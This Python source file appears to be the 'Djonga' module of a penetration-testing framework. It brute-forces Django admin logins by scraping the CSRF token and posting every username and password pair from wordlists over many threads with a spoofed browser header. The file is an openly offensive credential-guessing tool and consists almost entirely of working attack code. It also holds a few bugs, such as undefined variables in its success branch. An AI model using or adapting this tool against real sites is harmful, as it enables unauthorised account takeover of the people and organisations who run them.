# -*- coding: utf-8 -*-
"""
             _   _   _   _   _   _  
            / \ / \ / \ / \ / \ / \ 
        ((-( V | 1 | M | 4 | N | 4 )-))
            \_/ \_/ \_/ \_/ \_/ \_/ 

                    - DJONGA -


    Django authentication utility for Vimana Framework
    s4dhu <s4dhul4bs[at]prontonmail.ch

"""


# -*- coding: utf-8 -*-
import sys
sys.path.insert(0, '../../../')
from resources.colors import *
from resources.vmnf_validators import get_tool_scope

from core.vmnf_thread_handler import ThreadPool
from core.vmnf_thread_handler import Worker
from core.vmnf_shared_args import VimanaSharedArgs


from pathlib import Path

import argparse
import threading
import queue
from datetime import datetime
import requests
from requests import exceptions 
from bs4 import BeautifulSoup
import sys
from time import sleep
import os
#from colors import *
from resources.colors import *
from datetime import datetime
import pathlib 
import collections




class MyParser(argparse.ArgumentParser):
    def format_help(self):
        '''djonga help'''


class siddhi:
    module_information = collections.OrderedDict() 
    module_information = {
        "Name":            "Djonga",
        "Info":            "Utility to brute force forms in Django applications",
        "Category":        "Framework",
        "Framework":       "Django",
        "Type":            "Brute",
        "Module":          "siddhis/djonga",
        "Author":          "s4dhu <s4dhul4bs[at]prontonmail.ch",
        "Brief":           "Utility to brute force forms in Django applications",
        "Description":     """ 
        
        \r  Utility to audit forms of authentication in Django. 
        \r  In the present version, the tool adheres to the Django administration endpoint. 
        \r  Future versions may add other features, such as session auditing and other 
        \r  authentication endpoints.
        
        """

    }
    
    module_arguments = VimanaSharedArgs().shared_help.__doc__    
    start = True

    def __init__(self, **siddhi_args):

        self.siddhi_args = siddhi_args
        self.login_path = '/admin/login/?next=/admin/'
        self.logout_path= '/admin/logout'
        
        abspath = os.path.dirname(__file__)

        self.usernames = open('{}/recs/django_users.txt'.format(abspath), 'r').readlines()
        self.passwords = open('{}/recs/django_passwords.txt'.format(abspath), 'r').readlines()
        self.userlen   = len(self.usernames)
        self.passlen   = len(self.passwords)

        #self.target = siddhi_args['target']
        #self.URL = self.target + login_path
        self.client = requests.session()
        #self.LOGOUT_URL = self.target + logout_path
        self.token_cache = []


    def get_csrf_token(self, URL =False):
        
        if not URL:
            request_url = self.URL
        else:
            request_url = URL

        csrftoken = False

        try:
            soup = BeautifulSoup(self.client.get(request_url).content, "lxml")
            csrftoken = soup.find('input', dict(name='csrfmiddlewaretoken'))['value']
            self.token_cache.append(csrftoken)
        except IndexError:
            pass
        except TypeError:
            if len(self.token_cache) >= 1:
                csrftoken = self.token_cache[-1]
            else:
                print('[djonga:{}]Error to request target URL'.format(datetime.now()))
                sys.exit()
        except exceptions.ConnectionError as e:
            print('[+] %s'%(e.__doc__))
            sys.exit()

        return(csrftoken)


    def run_brute_force(self):
        
        users_len = Yn_c + str(len(self.usernames)) + D_c
        pass_len  = Yn_c + str(len(self.passwords)) + D_c
 
        csrftoken = False
        success_login = False

        djonga_start = G_c + str(datetime.now().strftime('%Y-%m-%d %H:%M:%S')) + D_c


        if self.random_token:
            csrftoken = self.get_csrf_token(False) 
        else:
            csrftoken = self.token_cache[0] 

        token = Rn_c + csrftoken + D_c
        userpass = R_c + str(self.username + ':' + self.password) + D_c  

        login_data = dict(
            username=self.username,     
            password=self.password, 
            csrfmiddlewaretoken=csrftoken
        )

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '145',
            'Connection': 'close',
            'Referer': self.URL,
            'Cookie': 'csrftoken= {}'.format(csrftoken),
            'Upgrade-Insecure-Requests': '1'
        }
    
        response = self.client.post(self.URL, data=login_data, headers=headers)
        response_headers = response.headers
        response_data = response.text
        status_code = response.status_code
        http_status = G_c + str(status_code) + D_c
            
        runtime = '[' + G_c + str(datetime.now().strftime('%H:%M:%S')) + D_c +']'
        
        if status_code == 200 and response_data.find('Welcome') != -1:
            http_status = Gn_c + str(status_code) + D_c
            status = Gn_c + 'Success' + D_c
            token = Gn_c + csrftoken + D_c
            userpass = Gn_c + str(username + ':' + password) + D_c
            
            self.get_csrf_token(self.LOGOUT_URL)
            sucess_login = True
            sleep(1)    
            
        elif status_code == 500 and response_data.find('Exception') -1:
            status = Yn_c + 'Exception' + D_c
        elif status_code == 403:
            status = Yn_c + 'Forbidden' + D_c
        else:
            status = R_c + 'Fail' + D_c
            token = R_c + csrftoken + D_c

                
        print(" {:<25} {:<20} {:<19} {:<40} {:>10}".format(runtime, http_status, status, userpass, token))


    def worker(self):
        name = threading.currentThread().getName()
        #print('+ Thread: {}'.format(name))

        while True:
            self.username = self.q.get()

            if self.username is None:
                self.q.task_done()
                break

            for password in self.passwords:
                self.password = password.strip()

                # call method brute
                self.run_brute_force()
                self.djonga_start = False

            self.q.task_done()


    def ThreadHandler(self):
        
        max_workers = 20
        self.djonga_start = True
        self.get_csrf_token(False)
        self.random_token = self.siddhi_args['random']
        
        num_threads = int(self.siddhi_args['threads'])

        if num_threads > max_workers:
            num_threads = max_workers

        pool = ThreadPool(num_threads)

        for username in self.usernames:
            for password in self.passwords:
                self.username = username.strip()
                self.password = password.strip()
                pool.add_task(self.run_brute_force)
        pool.wait_completion()


    def parse_args(self):
        ''' ~ siddhi needs only shared arguments from VimanaSharedArgs() ~'''

        parser = argparse.ArgumentParser(
                add_help=False,
                parents=[VimanaSharedArgs().args()]
        )

        return parser

    def start(self):
        handler_ns  = argparse.Namespace(
            target          = False, #self.URL,
            port            = False,
            random          = False,
            userlist        = False,
            passlist        = False,
            threads         = 5,
            scope           = False
        )
        
        options = self.parse_args()

        handler_ns.args = options.parse_known_args(
        namespace=handler_ns)[1]
    
        # if scope target was not defined
        if not self.siddhi_args['scope']:
            print(VimanaSharedArgs().shared_help.__doc__)
            sys.exit(1)

        targets_ports_set = get_tool_scope(**self.siddhi_args)

        for entry in targets_ports_set:
            self.target = 'http://' + entry
            self.URL = self.target + self.login_path
            self.LOGOUT_URL = self.target + self.logout_path

            djonga_start = G_c + str(datetime.now().strftime('%Y-%m-%d %H:%M:%S')) + D_c
                
            print("\nø {}Starting Dj0nga at {}\n".format(Wn_c, djonga_start, D_c))
            sleep(1)

            print('''- Target:    {}\n- Usernames: {}\n- Passwords: {}\n- Threads:   {}\n- Randomize: {}\n'''.format(
                handler_ns.target, 
                self.userlen, 
                self.passlen, 
                handler_ns.threads, 
                handler_ns.random
                )
            )
            sleep(2)
            
            # initial test to check if URL is accessible
            try:
                teste_response = self.client.get(self.URL)
            except requests.exceptions.ConnectionError:
                print('{}[djonga: {}] Failed to establish a connection.{}'.format(Rn_c, datetime.now(), D_c))
                return False
            except requests.exceptions.MissingSchema as MS:
                print('{}! Invalid schema, check target URL and try again {}'.format(Rn_c, D_c))
                return False
            except requests.exceptions.InvalidSchema as IS:
                print('{}! Invalid schema, check target URL and try again {}'.format(Rn_c, D_c))
                return False

            # response headers on first request ~
            for k,v in teste_response.headers.items():
                print(' {}[+]{} {}:{}'.format(G_c, D_c, k.strip('\n'),v.strip('\n')))
            
            sleep(1)

            print()
            print("{} {:<13} {:<9} {:<10} {:<10} {:>45}{}".format(
                Y_c, 'runtime', 'status', 'result', 'credential', 'csrftoken',D_c
                )
            )
            print("{} {:<13} {:<9} {:<10} {:<10} {:>45}{}\n".format(
                B_c,'--------','-----', '------', '----------', '---------', D_c
                )
            )
            sleep(1)
            
            self.ThreadHandler()
